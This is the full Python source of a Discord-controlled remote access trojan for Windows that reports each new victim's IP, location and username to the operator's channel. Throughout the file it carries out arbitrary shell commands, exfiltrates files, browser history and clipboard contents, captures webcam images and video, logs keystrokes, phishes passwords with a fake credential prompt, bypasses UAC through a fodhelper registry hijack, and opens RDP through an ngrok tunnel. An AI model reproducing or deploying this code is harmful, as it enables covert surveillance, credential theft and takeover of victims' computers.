  
# -*- coding: utf-8 -*-
import winreg
import ctypes
import sys
import os
import uuid
import random
import time
import subprocess
import discord
from discord.ext import commands
from ctypes import *
import asyncio
import discord
import atexit
global py
token = ''
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
helpmenu = """
Availaible commands are :
--> !webcampic = Take a picture from the webcam
--> !webcamvid = Take a video from webcam for selected amount of time /Syntax = "!webcamvid 7"
--> !message = Show a message box
--> !output = Execute a custom command that sends output
--> !custom = Execute a custom command that does not send any output
--> !voice = Make a voice say outloud a custom sentence
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get infected computer navigation history
--> !download = Download a file from infected computer
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Approximately geolocate using latitude and longitude of the ip adress with google map
--> !startkeylogger = Starts a keylogger
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !rdp = Activates RDP on target's computer and port forwards 3389 with ngrok (needs admin)
--> !stoprdp = Deactivates RDP on target's computer
--> !idletime = Get the idle time of user's on target computer
--> !sing = Play the chosen video in background
--> !stopsing = I think you get the point
--> !phishcreds = Phish user's credentials
--> !blockinput = Blocks user's keyboard and mouse 
--> !unblockinput = Unblocks user's keyboard and mouse
--> !exit = Exit program
"""

		

@client.event
async def on_ready():
	import platform
	import re
	import urllib.request
	import json
	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
		data = json.loads(url.read().decode())
	sep = ','
	rest = str(data).split(sep, 1)[0]
	ah = re.sub(r'^.*? ', ' ', rest)
	text = re.sub("[^a-zA-Z]","",ah)
	final = text.lower()
	global uuidgen
	uuidgen = str(uuid.uuid4())
	from requests import get
	ip = get('https://api.ipify.org').text
	pp = ip
	import os
	channel = client.get_channel() #Put ID of channel here
	is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
	if is_admin == True:
		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + ip + " " + ":flag_" + final + ":" + " | " + "User : " + os.getlogin() + " | " + ":gem:") 
	elif is_admin == False:
		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + ip + " " + ":flag_" + final + ":" + " | " + "User : " + os.getlogin())



def volumeup():
	import win32api
	import win32con
	for i in range(90):
		win32api.keybd_event(win32con.VK_VOLUME_UP, 0)


@client.event
async def on_message(message):
	if message.content.startswith("!interact"):
		global chosen
		chosen = message.content[10:]

	if chosen != uuidgen:
		pass
	else:
		if message.content == "!dumpkeylogger":
			import os
			temp = os.getenv("TEMP")
			file_keys = temp + "key_log.txt"
			file = discord.File(file_keys, filename=file_keys)
			await message.channel.send("[*] Command successfuly executed", file=file)
			os.popen("del " + file_keys)

		elif message.content == "!exit":
			import sys
			sys.exit()

		elif message.content == "!screenshot":
			from mss import mss
			with mss() as sct:
				sct.shot()
			file = discord.File("monitor-1.png", filename="monitor-1.png")
			await message.channel.send("[*] Command successfuly executed", file=file)

		if message.content.startswith("!message"):
			import ctypes
			MB_YESNO = 0x04
			MB_HELP = 0x4000
			ICON_STOP = 0x10
			result = ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP)

		if message.content.startswith("!phishcreds"):
			import os
			import io
			import sys
			import sqlite3
			import json
			import shutil
			import win32cred
			import win32crypt
			import win32api
			import win32con
			import pywintypes
			CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
			CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials
			creds = []
			creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
			print(creds)
			await message.channel.send("[*] Command successfuly executed " + str(creds))

		if message.content.startswith("!wallpaper"):
			import ctypes
			ctypes.windll.user32.SystemParametersInfoW(20, 0, message.content[11:], 0)
			await message.channel.send("[*] Command successfuly executed")

		if message.content.startswith("!upload"):
			await message.attachments[0].save(message.content[8:])
			await message.channel.send("[*] Command successfuly executed")

    		if message.content == '!webcampic':
        		import cv2
        		cam = cv2.VideoCapture(0)
        		retval, frame = cam.read()
        		cam.release()
        		cv2.imwrite('filename.jpg', frame)
        		cam.release()
        		file = discord.File("filename.jpg", filename="filename.jpg")
        		await  message.channel.send("[*] Command successfuly executed", file=file)


    		if message.content.startswith('!webcamvid'):
        		import numpy as np
        		import os
        		import subprocess
        		import cv2
        		import time
        		capture_duration = int(message.content[11:])
        		cap = cv2.VideoCapture(0)
        		fourcc = cv2.VideoWriter_fourcc(*'XVID')
        		out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
        		start_time = time.time()
        		while( int(time.time() - start_time) < capture_duration ):
            			ret, frame = cap.read()
            			if ret==True:
                			out.write(frame)
            			else:
        			        break
        		cap.release()
        		out.release()
        		cv2.destroyAllWindows()
		        file = discord.File("output.avi", filename="output.avi")
        		await  message.channel.send("[*] Command successfuly executed", file=file)
		        os.popen("del output.avi")

		if message.content.startswith("!output"):
			import subprocess
			import os
			instruction = message.content[8:]
			output = subprocess.run(instruction, stdout=subprocess.PIPE,
									shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = str(output.stdout.decode('CP437'))
			numb = len(result)
			if numb > 1990:
				f1 = open("output.txt", 'a')
				f1.write(result)
				f1.close()
				file = discord.File("output.txt", filename="output.txt")
				await message.channel.send("[*] Command successfuly executed", file=file)
				os.popen("del output.txt")
			else:
				await message.channel.send("[*] Command successfuly executed : " + result)
		if message.content.startswith("!custom"):
			import os
			import subprocess
			os.popen(message.content[8:])
			await message.channel.send("[*] Command successfuly executed")

		if message.content.startswith("!download"):
			file = discord.File(message.content[10:], filename=message.content[10:])
			await message.channel.send("[*] Command successfuly executed", file=file)

		if message.content.startswith("!cd"):
			import os
			os.chdir(message.content[4:])
			await message.channel.send("[*] Command successfuly executed")

		if message.content == "!help":
			await message.channel.send(helpmenu)

		if message.content.startswith("!write"):
			import pyautogui
			if message.content[7:] == "enter":
				pyautogui.press("enter")
			else:
				pyautogui.typewrite(message.content[7:])

		if message.content == "!history":
			import os
			import browserhistory as bh
			dict_obj = bh.get_browserhistory()
			strobj = str(dict_obj).encode(errors='ignore')
			f3 = open('history.txt', 'a')
			f3.write(str(strobj))
			f3.close()
			file = discord.File("history.txt", filename="history.txt")
			await message.channel.send("[*] Command successfuly executed", file=file)
			os.popen("del history.txt")

		if message.content == "!clipboard":
			import ctypes
			import os
			CF_TEXT = 1
			kernel32 = ctypes.windll.kernel32
			kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
			kernel32.GlobalLock.restype = ctypes.c_void_p
			kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
			user32 = ctypes.windll.user32
			user32.GetClipboardData.restype = ctypes.c_void_p
			user32.OpenClipboard(0)
			if user32.IsClipboardFormatAvailable(CF_TEXT):
				data = user32.GetClipboardData(CF_TEXT)
				data_locked = kernel32.GlobalLock(data)
				text = ctypes.c_char_p(data_locked)
				value = text.value
				kernel32.GlobalUnlock(data_locked)
				body = str(value)
				user32.CloseClipboard()
				await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + body)

		if message.content.startswith("!stopsing"):
			import os
			os.system("taskkill /F /IM iexplore.exe")
			os.chdir(appdata)
			os.system("del x0.vbs")

		if message.content == "!sysinfo":
			import platform
			jak = str(platform.uname())
			intro = jak[12:]
			from requests import get
			ip = get('https://api.ipify.org').text
			pp = "IP Adress = " + ip
			await message.channel.send("[*] Command successfuly executed : " + intro + pp)

		if message.content == "!geolocate":
			import urllib.request
			import json

			with urllib.request.urlopen("https://geolocation-db.com/json") as url:
				data = json.loads(url.read().decode())
				lol = str(data)
				lat = lol[112:]
				sep = ','
				restlat = lat.split(sep, 1)[0]
				longg = lol[134:]
				restlong = longg.split(sep, 1)[0]
				link = "http://www.google.com/maps/place/" + restlat + "," + restlong
				await message.channel.send("[*] Command successfuly executed : " + link)

		if message.content == "!admincheck":
			import ctypes
			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
			if is_admin == True:
				await message.channel.send("[*] Congrats you're admin")
			elif is_admin == False:
				await message.channel.send("[*] Sorry, you're not admin")

		if message.content == "!uacbypass":
			import os
			import win32net
			if 'logonserver' in os.environ:
				server = os.environ['logonserver'][2:]
			else:
				server = None

			def if_user_is_admin(Server):
				groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
				isadmin = False
				for group in groups:
					if group.lower().startswith('admin'):
						isadmin = True
				return isadmin, groups
			is_admin, groups = if_user_is_admin(server)
			# Result handeling
			if is_admin == True:
				print('User in admin group trying to bypass uac')
				import os
				import sys
				import ctypes
				import winreg
				CMD = "C:\\Windows\\System32\\cmd.exe"
				FOD_HELPER = 'C:\\Windows\\System32\\fodhelper.exe'
				COMM = "start"
				REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
				DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

				def is_running_as_admin():
					'''
					Checks if the script is running with administrative privileges.
					Returns True if is running as admin, False otherwise.
					'''
					try:
						return ctypes.windll.shell32.IsUserAnAdmin()
					except:
						return False

				def create_reg_key(key, value):
					'''
					Creates a reg key
					'''
					try:
						winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
						registry_key = winreg.OpenKey(
							winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
						winreg.SetValueEx(registry_key, key, 0,
										  winreg.REG_SZ, value)
						winreg.CloseKey(registry_key)
					except WindowsError:
						raise

				def bypass_uac(cmd):
					'''
					Tries to bypass the UAC
					'''
					try:
						create_reg_key(DELEGATE_EXEC_REG_KEY, '')
						create_reg_key(None, cmd)
					except WindowsError:
						raise

				def execute():
					if not is_running_as_admin():
						print(
							'[!] The script is NOT running with administrative privileges')
						print('[+] Trying to bypass the UAC')
						try:
							current_dir = os.path.dirname(
								os.path.realpath(__file__)) + '\\' + "Prototype.exe"
							cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
							print(cmd)
							bypass_uac(cmd)
							os.system(FOD_HELPER)
							sys.exit(0)
						except WindowsError:
							sys.exit(1)
					else:
						print(
							'[+] The script is running with administrative privileges!')
				if __name__ == '__main__':
					execute()
			else:
				print("failed")
				await message.channel.send("[*] Command failed : User not in administator group")

		if message.content.startswith("!sing"):
			import os
			volumeup()
			os.chdir(appdata)
			choice = message.content[6:]
			f1 = open('x0.vbs', 'a')
			f1.write('Set ie = CreateObject("InternetExplorer.Application")' + "\r\n")
			f1.write("ie.Visible = 0" + "\r\n")
			f1.write('ie.Navigate2' + ' ' + '"' + choice + '"')
			f1.close()
			os.system('x0.vbs')
			import time
			time.sleep(10)
			os.system("del x0.vbs")

		if message.content == "!startkeylogger":
			import base64
			import os
			from pynput.keyboard import Key, Listener
			import logging
			temp = os.getenv("TEMP")
			log_dir = temp
			logging.basicConfig(filename=(log_dir + "key_log.txt"),
								level=logging.DEBUG, format='%(asctime)s: %(message)s')

			def keylog():
				def on_press(key):
					logging.info(str(key))
				with Listener(on_press=on_press) as listener:
					listener.join()
			import threading
			global test
			test = threading.Thread(target=keylog)
			test._running = True
			test.daemon = True
			test.start()
			await message.channel.send("[*] Keylogger successfuly started")

		if message.content == "!stopkeylogger":
			import os
			test._running = False
			await message.channel.send("[*] Keylogger successfuly stopped")

		if message.content == "!idletime":
			class LASTINPUTINFO(Structure):
				_fields_ = [
					('cbSize', c_uint),
					('dwTime', c_int),
				]

			def get_idle_duration():
				lastInputInfo = LASTINPUTINFO()
				lastInputInfo.cbSize = sizeof(lastInputInfo)
				if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
					millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
					return millis / 1000.0
				else:
					return 0
			import threading
			global idle1
			idle1 = threading.Thread(target=get_idle_duration)
			idle1._running = True
			idle1.daemon = True
			idle1.start()
			duration = get_idle_duration()
			await message.channel.send('User idle for %.2f seconds.' % duration)
			import time
			time.sleep(1)
		if message.content == "!rdp":
			import os
			import ctypes
			import logging
			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
			if is_admin == False:
					body = "you need to be admin for this operation"
					await message.channel.send("[*] Command failed " + body)
			else:
				try:
					os.popen('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
					os.popen("netsh advfirewall firewall set rule group='remote desktop' new enable=Yes")
					from pyngrok import ngrok
					public_url = ngrok.connect(3389)
					rdp = ngrok.connect(3389, "tcp")
					tunnels = ngrok.get_tunnels()
					await message.channel.send("[*] Rdp Opened " + str(tunnels))
				except:
					mdr = logging.exception('')
					await message.channel.send("[*] Command failed "+ str(mdr))
		

		if message.content.startswith("!voice"):
			volumeup()
			import win32com.client as wincl
			speak = wincl.Dispatch("SAPI.SpVoice")
			speak.Speak(message.content[7:])
			comtypes.CoUninitialize()
			await  message.channel.send("[*] Command successfuly executed")

		if message.content.startswith("!blockinput"):
			import ctypes
			ok = windll.user32.BlockInput(True)
			await  message.channel.send("[*] Command successfuly executed")
		if message.content.startswith("!unblockinput"):
			ok = windll.user32.BlockInput(False)
			await  message.channel.send("[*] Command successfuly executed")

		if message.content == "!stoprdp":
			import os
			import ctypes
			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
			if is_admin == False:
					body = "you need to be admin for this operation"
					await message.channel.send("[*] Command failed " + body)
			else:
					os.popen('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
					await message.channel.send("[*] Rdp stopped")
client.run(token)
